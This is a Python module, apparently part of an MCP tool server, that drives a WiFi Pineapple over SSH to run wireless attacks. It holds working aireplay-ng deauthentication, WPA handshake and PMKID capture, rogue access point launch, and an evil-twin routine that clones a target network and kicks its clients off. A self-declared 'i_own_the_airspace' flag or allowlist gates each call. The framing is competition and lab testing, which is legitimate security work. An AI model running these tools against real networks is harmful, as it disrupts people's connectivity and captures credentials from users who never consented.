"""
Composed attack sequences. All SSH-heavy.

Every transmitting tool refuses unless the caller passes
`i_own_the_airspace=True` OR an `authorization` scope. Refusal is
loud — it returns a normal envelope with ok=False and a warning
citing plan-organize.md § "Legal & consent". At a DEF CON WCTF you
flip the flag once for the session.

Every SSH invocation is captured in call_log with its exact command
string, per the plan-organize.md invariant:
    "Every SSH tool records its shell invocation in `call_log`"

Preconditions with citations (Phase 2 will move these strings into
records/attacks.json + records/defense_and_detection.json):

  * deauth refuses against PMF-required targets — 802.11w PMF
    authenticates unicast deauth/disassoc; broadcast deauth is dropped
    outright. See plan-knowledge.md § "Explicitly disputed / ambiguous
    entries — 'PMF prevents deauth'".
"""

from __future__ import annotations

import shlex
import time
from dataclasses import dataclass
from typing import Any

from p1n3nut5_mcp.pineapple_ssh import PineappleSSH, RunResult
from p1n3nut5_mcp.runtime import Config, Transport, envelope


class AuthorizationRequired(RuntimeError):
    """Raised when a transmitting tool is called without airspace consent."""


@dataclass
class Authorization:
    """Per-call airspace consent. See plan-organize.md § 'Legal & consent'."""

    i_own_the_airspace: bool = False
    ssid_allowlist: tuple[str, ...] = ()
    bssid_allowlist: tuple[str, ...] = ()

    def allows_target(self, ssid: str | None = None, bssid: str | None = None) -> bool:
        if self.i_own_the_airspace:
            return True
        if not (self.ssid_allowlist or self.bssid_allowlist):
            return False
        if ssid and self.ssid_allowlist and ssid in self.ssid_allowlist:
            return True
        if bssid and self.bssid_allowlist and bssid.lower() in {
            b.lower() for b in self.bssid_allowlist
        }:
            return True
        return False


PMF_STOPS_DEAUTH_CITE = (
    "PMF-required target rejects unicast deauth; broadcast is dropped. "
    "See plan-knowledge.md § 'PMF prevents deauth' and the attacks.json "
    "deauth-broadcast / deauth-targeted records (Phase 2)."
)


def _require_authz(authz: Authorization | None, *, ssid=None, bssid=None) -> Authorization:
    if authz is None:
        raise AuthorizationRequired(
            "airspace authorization missing. Pass authorization=Authorization("
            "i_own_the_airspace=True) at a DEF CON WCTF, or an ssid_allowlist/"
            "bssid_allowlist in office/lab mode. See plan-organize.md § "
            "'Legal & consent'."
        )
    if not authz.allows_target(ssid=ssid, bssid=bssid):
        raise AuthorizationRequired(
            f"target ssid={ssid!r} bssid={bssid!r} not in authorized scope. "
            f"See plan-organize.md § 'Legal & consent'."
        )
    return authz


# --- SSH-only attack primitives ---------------------------------------------


async def deauth(
    bssid: str,
    client_mac: str | None = None,
    count: int = 5,
    reason: int = 7,
    iface: str = "wlan1mon",
    respect_pmf: bool = True,
    authorization: Authorization | None = None,
    *,
    ssh: PineappleSSH,
    target_pmf: str | None = None,  # inject the target's PMF state (from get_ap_details)
) -> dict:
    """Send N deauth frames. Aireplay-ng flavor.

    `target_pmf` is the value from `get_ap_details(bssid).security_detail.pmf`
    ("required" | "capable" | "disabled" | None). When respect_pmf=True and
    the target advertises PMF-required, we refuse with a citation.
    """
    _require_authz(authorization, bssid=bssid)
    started = time.monotonic()
    warnings: list[str] = []

    if respect_pmf and target_pmf == "required":
        warnings.append(PMF_STOPS_DEAUTH_CITE)
        return envelope(
            ok=False,
            transport="ssh",
            payload={"refused": True, "reason": "pmf-required"},
            started_at=started,
            warnings=warnings,
        )

    target_arg = f"-c {shlex.quote(client_mac)}" if client_mac else ""
    cmd = (
        f"aireplay-ng --deauth {count} "
        f"-a {shlex.quote(bssid)} {target_arg} "
        f"--reason {reason} {shlex.quote(iface)}".strip()
    )
    result = await ssh.run(cmd)
    if result.exit_status != 0:
        warnings.append(f"aireplay-ng exit {result.exit_status}: {result.stderr.strip()}")
    return envelope(
        ok=result.exit_status == 0,
        transport="ssh",
        payload={
            "cmd": cmd,
            "stdout": result.stdout,
            "count": count,
            "reason": reason,
            "bssid": bssid,
            "client_mac": client_mac,
        },
        started_at=started,
        warnings=warnings,
    )


async def capture_handshake(
    bssid: str,
    timeout_s: int = 60,
    out_path: str | None = None,
    deauth_client: str | None = None,
    iface: str = "wlan1mon",
    channel: int | None = None,
    authorization: Authorization | None = None,
    *,
    ssh: PineappleSSH,
) -> dict:
    """airodump-ng capture + optional targeted deauth.

    Returns the on-Pineapple path of the resulting pcap.
    """
    _require_authz(authorization, bssid=bssid)
    started = time.monotonic()
    warnings: list[str] = []

    out = out_path or f"/tmp/handshake-{bssid.replace(':', '')}.pcap"
    ch = f"-c {channel} " if channel else ""
    airodump = (
        f"timeout {int(timeout_s)} airodump-ng {ch}"
        f"--bssid {shlex.quote(bssid)} -w {shlex.quote(out.removesuffix('.pcap'))} "
        f"--output-format pcap {shlex.quote(iface)}"
    )
    r_ad = await ssh.run(airodump)
    if r_ad.exit_status not in (0, 124):  # 124 = timeout(1) normal exit
        warnings.append(f"airodump-ng exit {r_ad.exit_status}")

    deauth_cmd: str | None = None
    if deauth_client:
        deauth_cmd = (
            f"aireplay-ng --deauth 5 -a {shlex.quote(bssid)} "
            f"-c {shlex.quote(deauth_client)} {shlex.quote(iface)}"
        )
        r_de = await ssh.run(deauth_cmd)
        if r_de.exit_status != 0:
            warnings.append(f"targeted deauth exit {r_de.exit_status}")

    return envelope(
        ok=True,
        transport="ssh",
        payload={
            "cmd": airodump,
            "deauth_cmd": deauth_cmd,
            "out_path": f"{out.removesuffix('.pcap')}-01.pcap",  # airodump appends -01
            "bssid": bssid,
        },
        started_at=started,
        warnings=warnings,
    )


async def capture_pmkid(
    bssid: str | None = None,
    timeout_s: int = 60,
    out_path: str | None = None,
    iface: str = "wlan1",
    authorization: Authorization | None = None,
    *,
    ssh: PineappleSSH,
) -> dict:
    """hcxdumptool in PMKID-collect mode. See plan-knowledge.md § 'pmkid/'."""
    _require_authz(authorization, bssid=bssid)
    started = time.monotonic()

    out = out_path or "/tmp/pmkid.pcapng"
    filter_arg = f"--bpfc={shlex.quote(f'ether host {bssid}')} " if bssid else ""
    # -o pcapng, --enable_status, --disable_deauthentication (default in modern hcxdumptool)
    cmd = (
        f"timeout {int(timeout_s)} hcxdumptool -i {shlex.quote(iface)} "
        f"-o {shlex.quote(out)} {filter_arg}--enable_status=1"
    )
    r = await ssh.run(cmd)
    warnings: list[str] = []
    if r.exit_status not in (0, 124):
        warnings.append(f"hcxdumptool exit {r.exit_status}")
    return envelope(
        ok=True,
        transport="ssh",
        payload={"cmd": cmd, "out_path": out, "bssid": bssid},
        started_at=started,
        warnings=warnings,
    )


async def create_rogue_ap(
    ssid: str,
    channel: int,
    security: str = "open",  # 'open' | 'wpa2_psk' | 'wpa2_eap' | 'wpa3_sae'
    psk: str | None = None,
    bssid: str | None = None,
    iface: str = "wlan0",
    band: str = "2.4",
    hidden: bool = False,
    authorization: Authorization | None = None,
    *,
    ssh: PineappleSSH,
) -> dict:
    """Templated hostapd.conf → SCP → launch under a named process.

    Phase 5 writes the config over SSH via `cat > file`, launches hostapd
    with `-B` (background), records the exact invocation. The handle
    returned is the pid file path so `stop_rogue_ap(handle)` can kill it.
    """
    _require_authz(authorization, ssid=ssid, bssid=bssid)
    started = time.monotonic()
    warnings: list[str] = []

    conf = _hostapd_conf(
        ssid=ssid,
        channel=channel,
        security=security,
        psk=psk,
        bssid=bssid,
        iface=iface,
        band=band,
        hidden=hidden,
    )
    conf_path = f"/tmp/hostapd-{ssid.replace(' ', '_')}.conf"
    pid_path = f"/tmp/hostapd-{ssid.replace(' ', '_')}.pid"

    # Upload conf via a heredoc — no scp needed
    r_upload = await ssh.run(
        f"cat > {shlex.quote(conf_path)} <<'P1N3EOF'\n{conf}\nP1N3EOF"
    )
    if r_upload.exit_status != 0:
        warnings.append("failed to write hostapd conf")

    launch = f"hostapd -B -P {shlex.quote(pid_path)} {shlex.quote(conf_path)}"
    r_launch = await ssh.run(launch)
    if r_launch.exit_status != 0:
        warnings.append(f"hostapd launch exit {r_launch.exit_status}: {r_launch.stderr.strip()}")

    return envelope(
        ok=r_launch.exit_status == 0,
        transport="ssh",
        payload={
            "cmd": launch,
            "handle": pid_path,
            "conf_path": conf_path,
            "ssid": ssid,
            "channel": channel,
            "security": security,
        },
        started_at=started,
        warnings=warnings,
    )


async def stop_rogue_ap(
    handle: str,
    authorization: Authorization | None = None,
    *,
    ssh: PineappleSSH,
) -> dict:
    _require_authz(authorization)
    started = time.monotonic()
    cmd = f"kill $(cat {shlex.quote(handle)}) && rm -f {shlex.quote(handle)}"
    r = await ssh.run(cmd)
    return envelope(
        ok=r.exit_status == 0,
        transport="ssh",
        payload={"cmd": cmd, "handle": handle, "stdout": r.stdout},
        started_at=started,
        warnings=[f"exit {r.exit_status}: {r.stderr.strip()}"] if r.exit_status != 0 else [],
    )


async def stop_all_rogue_aps(
    ssh: PineappleSSH, authorization: Authorization | None = None
) -> dict:
    """Sweep — kills every hostapd this MCP instance launched.

    Backs the MAX_ROGUE_MINUTES cost/safety guardrail: the runtime
    watches wall-clock on each rogue AP and calls this when the
    limit is hit.
    """
    _require_authz(authorization)
    started = time.monotonic()
    cmd = "for p in /tmp/hostapd-*.pid; do [ -f \"$p\" ] && kill $(cat \"$p\") 2>/dev/null; rm -f \"$p\"; done"
    r = await ssh.run(cmd)
    return envelope(
        ok=r.exit_status == 0,
        transport="ssh",
        payload={"cmd": cmd, "stdout": r.stdout},
        started_at=started,
        warnings=[],
    )


async def evil_twin(
    target_bssid: str,
    target_ssid: str,
    target_channel: int,
    iface: str = "wlan0",
    deauth_iface: str = "wlan1mon",
    deauth_clients: bool = True,
    authorization: Authorization | None = None,
    *,
    ssh: PineappleSSH,
) -> dict:
    """Clone the SSID + BSSID + channel; optionally deauth existing clients.

    See plan-knowledge.md § 'evil-twin/'.
    """
    _require_authz(authorization, ssid=target_ssid, bssid=target_bssid)
    started = time.monotonic()
    warnings: list[str] = []

    twin = await create_rogue_ap(
        ssid=target_ssid,
        channel=target_channel,
        security="open",
        bssid=target_bssid,
        iface=iface,
        authorization=authorization,
        ssh=ssh,
    )
    warnings.extend(twin["warnings"])

    deauth_result: dict[str, Any] | None = None
    if deauth_clients:
        deauth_result = await deauth(
            bssid=target_bssid,
            iface=deauth_iface,
            authorization=authorization,
            ssh=ssh,
            respect_pmf=True,
        )
        warnings.extend(deauth_result["warnings"])

    return envelope(
        ok=twin["ok"],
        transport="ssh",
        payload={
            "twin": twin["payload"],
            "deauth": deauth_result["payload"] if deauth_result else None,
            "target_bssid": target_bssid,
            "target_ssid": target_ssid,
        },
        started_at=started,
        warnings=warnings,
    )


# --- hostapd.conf template --------------------------------------------------


def _hostapd_conf(
    *,
    ssid: str,
    channel: int,
    security: str,
    psk: str | None,
    bssid: str | None,
    iface: str,
    band: str,
    hidden: bool,
) -> str:
    lines = [
        f"interface={iface}",
        f"ssid={ssid}",
        f"channel={channel}",
        f"hw_mode={'a' if band == '5' else 'g'}",
    ]
    if bssid:
        lines.append(f"bssid={bssid}")
    if hidden:
        lines.append("ignore_broadcast_ssid=1")
    if security == "open":
        pass  # nothing else
    elif security == "wpa2_psk":
        if not psk:
            raise ValueError("wpa2_psk security requires psk=")
        lines += [
            "wpa=2",
            "wpa_key_mgmt=WPA-PSK",
            "wpa_pairwise=CCMP",
            "rsn_pairwise=CCMP",
            f"wpa_passphrase={psk}",
        ]
    elif security == "wpa3_sae":
        if not psk:
            raise ValueError("wpa3_sae security requires psk=")
        lines += [
            "wpa=2",
            "ieee80211w=2",
            "wpa_key_mgmt=SAE",
            "rsn_pairwise=CCMP",
            f"sae_password={psk}",
        ]
    elif security == "wpa2_eap":
        lines += [
            "wpa=2",
            "wpa_key_mgmt=WPA-EAP",
            "wpa_pairwise=CCMP",
            "rsn_pairwise=CCMP",
            "ieee8021x=1",
            # RADIUS block must be filled in by caller (rogue_radius);
            # Phase 5 leaves the placeholder to be substituted later.
            "# RADIUS: fill in via rogue_radius() before launch",
        ]
    else:
        raise ValueError(f"unknown security {security!r}")
    return "\n".join(lines)
